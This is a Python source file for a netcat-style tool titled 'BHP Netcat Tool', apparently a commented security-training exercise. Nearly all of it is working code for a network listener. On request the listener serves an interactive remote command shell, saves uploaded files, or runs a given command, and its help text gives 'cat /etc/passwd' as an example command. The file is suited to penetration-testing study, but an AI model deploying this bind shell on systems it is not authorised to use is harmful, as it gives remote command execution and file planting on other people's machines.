import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading

#Takes commands that we pass it, and does things to it to prepare it for network traversal
def execute(command):
    command = command.strip()
    if not command:
        return
    output = subprocess.check_output(shlex.split(command),
                                     stderr=subprocess.STDOUT)
    return output.decode()

class NetCat:
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    #used to determine whether the user is running it as a listener or client
    def run(self):
        if self.args.listen:
            self.listen()
        else:
            self.send()

    #executes when the user doesn't specify listener mode.
    def send(self):
        self.socket.connect((self.args.target, self.args.port))
        #check if we have a buffer, and if we do, send that to the listener/target first
        if self.buffer:
            self.socket.send(self.buffer)

        try:
            #start a loop to receive data from the target
            while True:
                recv_len = 1
                response = ''
                while recv_len:
                    #receive data from the socket
                    data = self.socket.recv(4096)
                    #check the size of the data thats being received
                    recv_len = len(data)
                    #decodes data to make it readable
                    response += data.decode()
                    if recv_len < 4096:
                        break
                if response:
                    #prints response from target
                    print(response)
                    #requests user for input
                    buffer = input('> ')
                    buffer += '\n'
                    #sends the encoded input
                    self.socket.send(buffer.encode())
        except KeyboardInterrupt:
            print('User terminated.')
            self.socket.close()
            sys.exit()


    def listen(self):
        #binds to the target & port (starts a socket(listener))
        self.socket.bind((self.args.target, self.args.port))
        #listen for a maximum of 5 connections
        self.socket.listen(5)
        while True:
            #return a new socket representing the connection, and the address of the client
            client_socket, _ = self.socket.accept()
            #passing the socket to the handle method (handle is where we'll the logic for all the features of our listener is at)
            client_thread = threading.Thread(
                target=self.handle, args=(client_socket,)
            )
            #start the threads activity
            client_thread.start()
        
    def handle(self, client_socket):
        #checks if the --execute argument was issued
        if self.args.execute:
            #executes the execute() method on the command/s we give it
            output = execute(self.args.execute)
            #sends the prepared commands to the client
            client_socket.send(output.encode())

        #checks if the --upload argument was issued
        elif self.args.upload:
            #set up a loop to listen for content on the listening socket, and receive data (data that we're uploading to it ourselves(files)), until theres no more data coming in
            file_buffer = b''
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else: 
                    break

            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
            message = f'Saved file {self.args.upload}'
            client_socket.send(message.encode())

        elif self.args.command:
            cmd_buffer = b''
            while True:
                try:
                    client_socket.send(b'BHP: #> ')
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
                    response = execute(cmd_buffer.decode())
                    if response:
                        client_socket.send(response.encode())
                    cmd_buffer = b''
                except Exception as e:
                    print(f'server killed {e}')
                    self.socket.close()
                    sys.exit()



if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='BHP Netcat Tool',
                                     formatter_class=argparse.RawDescriptionHelpFormatter,
                                     epilog=textwrap.dedent('''Example:
                                                            netcat.py -t IP -p PORT -l -c # command shell
                                                            netcat.py -t IP -p PORT -l -u=test.txt # upload file
                                                            netcat.py -t IP -p PORT -l -e=\"cat /etc/passwd\" # execute command
                                                            echo 'TEST' | ./netcat.py -t IP -p PORT # echo text to server port
                                                            netcat.py -t IP -p PORT # connect to listener
                                                        '''))
    parser.add_argument('-c', '--command', action='store_true', help='command shell')
    parser.add_argument('-e', '--execute', help='execute specified command')
    parser.add_argument('-l', '--listen', action='store_true', help='listen')
    parser.add_argument('-p', '--port', type=int, default=5555, help='specified PORT')
    parser.add_argument('-t', '--target', default='192.168.1.203', help='specified IP')
    parser.add_argument('-u', '--upload', help='upload file')
    args = parser.parse_args()
    if args.listen:
        buffer = ''
    else:
        buffer = sys.stdin.read()

    nc = NetCat(args, buffer.encode())
    nc.run()                              
                
                                    


